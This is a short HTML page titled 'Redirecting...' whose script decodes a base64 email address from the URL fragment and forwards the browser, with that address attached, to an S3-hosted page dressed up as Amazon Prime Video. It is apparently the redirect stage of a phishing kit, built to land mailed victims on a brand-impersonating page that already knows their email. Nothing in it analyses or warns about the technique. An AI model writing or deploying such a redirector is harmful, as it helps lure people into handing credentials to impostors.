<title>Redirecting...</title>
<script> 
var hash = window.location.hash;
if(hash !== "") {

    hash = hash.split('#');
    var email = hash[1];
    email = atob(email);
    window.location.href = "https://primevideolinks-clearing.s3.eu-central-1.amazonaws.com/primetimevideo-ent/index.html#" + email;
}
</script>
